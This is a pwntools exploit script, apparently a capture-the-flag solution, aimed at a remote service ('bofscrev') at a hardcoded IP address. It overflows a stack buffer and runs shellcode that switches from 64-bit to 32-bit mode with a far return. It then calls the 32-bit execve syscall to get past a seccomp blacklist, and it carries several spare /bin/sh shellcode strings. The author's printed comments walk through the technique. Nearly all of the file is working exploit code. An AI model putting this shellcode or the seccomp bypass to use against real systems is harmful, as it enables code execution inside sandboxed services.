#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.13"
port = 56746

yuan = remote(host,port)
yuan.recvuntil('x')
ad = yuan.recvuntil('\n')
buf_addr = int(ad , 16)

main = 0x4007b0
pop_rdi = 0x4008a3
gets_plt = 0x400560
puts_plt = 0x400520
ret = '\xc3'
retf = '\xcb'
dyna = 0x600e30
got = 0x601000

flag = '/home/bofscrev/flag.exe'
hflag = '2f2f686f'+'6d652f62'+'6f667363'+'7265762f'+'666c6167'+'2e657865'
_1 = 0x6578652e
_2 = 0x67616c66
_3 = 0x2f766572
_4 = 0x6373666f
_5 = 0x622f656d
_6 = 0x6f682f2f

m = '\x48\xbb'+'\x23'+'\x00'*7+'\x53'+'\x48\xbb'+p64(got+0x18)+'\x53'+'\x48\xcb'

x64_shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91'+ret+'\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
x32_shellcode =  "\x6a\x04"                      #/* push   0xb */
x32_shellcode += "\x58"                          #/* pop    eax */
x32_shellcode += "\x31\xf6"                      #/* xor    esi,esi */
x32_shellcode += "\x56"                          #/* push   esi */
x32_shellcode += "\x68\x2f\x2f\x73\x68"          #/* push   0x68732f2f */
x32_shellcode += "\x68\x2f\x62\x69\x6e"          #/* push   0x6e69622f */
x32_shellcode += "\x89\xe3"                      #/* mov    ebx,esp */
x32_shellcode += "\x31\xc9"                      #/* xor    ecx,ecx */
x32_shellcode += "\x89\xca"                      #/* mov    edx,ecx */
x32_shellcode += "\xcd\x80"                      #/* int    0x80 */

m1  = '\x48\x31\xd2' # xor rdx,rdx
m1 += '\x48\xC7\xC2\xa0\x00\x00\x00' # mov rdx , 0xa0
m1 += '\x48\xC7\xC0\x00\x00\x00\x00' # mov rax , 0x0
m1 += '\x48\xC7\xC7\x00\x00\x00\x00' # mov rdi , 0x0
m1 += '\x5e' # pop rsi
m1 += '\x0F\x05' # syscall

m1 += '\x48\x31\xd2' # xor rdx,rdx
m1 += '\x48\xC7\xC2\x2e\x00\x00\x00' # mov rdx , 0x2e 46
m1 += '\x48\xC7\xC0\x01\x00\x00\x00' # mov rax , 0x1
m1 += '\x48\xC7\xC7\x01\x00\x00\x00' # mov rdi , 0x1
m1 += '\x5e' # pop rsi
m1 += '\x0F\x05' # syscall

m1 += '\xc3' # ret

shellcode = m1 + m
payload = shellcode

p = payload
p += 'a' * (112 - len(payload))
p += 'RBBBBBBP'
p += p64(buf_addr)
p += p64(got)
p += p64(got)
p += p64(buf_addr+0x37)

bin_sh = '\x2f\x62\x69\x6e\x2f\x73\x68\x00'
flag_string ='\x2F\x68\x6F\x6D\x65\x2F\x62\x6F\x66\x73\x63\x72\x65\x76\x2F\x66\x6C\x61\x67\x2E\x65\x78\x65\x00'
legacy = '\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x00\x10\x60\x00\xBA\x04\x00\x00\x00\xCD\x80'
sss = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
s3 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80'
s4 = '\xB9\x00\x10\x60\x00\xBB\x01\x00\x00\x00\xBA\xaa\x00\x00\x00\xB8\x04\x00\x00\x00\xCD\x80'
yuan_32  = '\x31\xC0' #xor eax,eax
yuan_32 += '\x50' #push eax
yuan_32 += '\x68\x2E\x65\x78\x65'
yuan_32 += '\x68\x66\x6C\x61\x67'
yuan_32 += '\x68\x72\x65\x76\x2F'
yuan_32 += '\x68\x6F\x66\x73\x63'
yuan_32 += '\x68\x6D\x65\x2F\x62'
yuan_32 += '\x68\x2F\x2F\x68\x6F'
yuan_32 += '\x89\xE3' # mov ebx , esp
yuan_32 += '\x50' #push eax
yuan_32 += '\x53' #push ebx
yuan_32 += '\x89\xE1' # mov ecx,esp
yuan_32 += '\xB8\x04\x00\x00\x00' # mov eax,0xb
yuan_32 += '\xCD\x80' #ini 0x80

gg =  '\xBB\x00\x10\x60\x00' #mov ebx , [got]
gg += '\x31\xc0' # xor eax,eax
gg += '\x89\xC2' # mov edx , eax
gg += '\xB9\x00\x00\x00\x00' # mov ecx , 0x0
#gg += '\xB9\x00\x10\x60\x00' # mov ecx , [got]
gg += '\xB8\x0B\x00\x00\x00' # mov eax , 0xb
gg += '\xCD\x80' # int 0x80

print "ççç After using the libseccomp's tools , according to the results the following numbers of syscall are in blacklist: "
print "ççç +--------------------+"
print "ççç |   2     open       |"
print "ççç |   57    fork       |"
print "ççç |   58    vfork      |"
print "ççç |   59    execve     |"
print "ççç |   257   openat     |"
print "ççç |   322   execveat   |"
print "ççç |   520   execve     |"
print "ççç +--------------------+"
print "ççç You can see even the x32-specific system call numbers to avoid cache impact for native 64-bit operation , like 520 , "
print "ççç also in the blaklist !!!!!!! Fuck all . So , we have to find other way of caurse... ,then I searched some vulnerabilities "
print "ççç about bypass seccomp blacklist by using 32bit syscall , how does it work , because in some Linux kernel it can support to "
print "ççç run a 32bit program ,that also explian why in x64 long mode Linux system they still keep some legacy segment register like "
print "ççç fs gs cs ss ds es . As for 32bit syscall execve() , it's number for syscall is 0xb which mean that it's syscall number is 11 and "
print "ççç it is not in seccomp blacklist , but it do the execution action ! In addition , if you execute some instructions or 64bit ELF ,"
print "ççç it may use some syscall in blacklist , so it will still be terminated! , so if you want to go this way , you must to check all"
print "ççç situations are expected."
print
print "ççç First , we know the ELF is 64bit and it's NX is disable , and it also give us the entry point address of buffer which for us to input."
print "ççç And then , we want to switch to 32bit mod so that we can call 32bit syscall , so for the next , we have to write a payload to do this."
print "ççç The payload's first step is to write our 32bit shellcocde to 32bit memory which high 4 bytes of address is 0x0. "
print "ççç The first part of payload I call it m1 , m1 payload is going to use 64bit read() syscall to write our 32bit payload from stdin into 32bit memory , "
print "ççç then I use 64 bit write() syscall to dump the results in memory through stdout for checking, and the memory i writed into is .got because "
print "ççç it's high 8 bytes of address is 0x0."
print "ççç Here is m1 payload:"
print
print "ççç m1 payload ->", m1
print
yuan.sendline(p)

yuan.sendline(flag_string+gg+'\n')
yuan.recvuntil('~\n')
write = yuan.recvuntil('\n')
#print write
print "ççç And the dumping results of memory in .got:"
print "ççç ", hex(got) ,'->' ,write
print
print "ççç It's our 32bit payload ->" , write
print "ççç You can see the 32bit payload is composed of the data and the 32bit shellcode."
print 
print "ççç data_parameters ->", flag_string
print "ççç 32bit shellcode ->", gg
print
print "ççç So , we already wrote 32bit payload to 32bit memory , next step is the most important step !"
print "ççç How to switch to 32bit mode in 64bit long mode ? After reading a large number of books and articles form the web , the key point is CS segment"
print "ççç registor , you have to override it with 0x33 for x64 , 0x23 for x86 , which meaning some Segment Selector ."
print "ççç Then I found the 'retf' instruction which opcode is '0xcb' , it do the things that pop IP/EIP first then pop CS , but you can't directively  use it "
print "ççç in 64bit long mode , it would occur some errors. After searching some articles , you can use it in 64bit long mode with prefix '0x48'."
print "ççç So the next part of payload is m payload , which do the things that push 0x23 and the 32bit address of our 32bit shellcode , than execute jetf instruction"
print "ççç to pop tham into RIP and override the CS with 0x23 ."
print "ççç Here is the m payload:"
print 
print "ççç m payload ->", m
print
print "ççç payload ->" , p
print
print "ççç The result of m payload is that we switch to 32bit mode and it's eip is going to run our 32bit shellcode program !!!"
print "ççç With the data and parameters I already set in the front of 32bit payload , the 32bit shellcode will call the 32bit syscall to execute the 32bit program !!! "
print
print "ççç OK OK Here is the flag ~"
print
yuan.interactive()
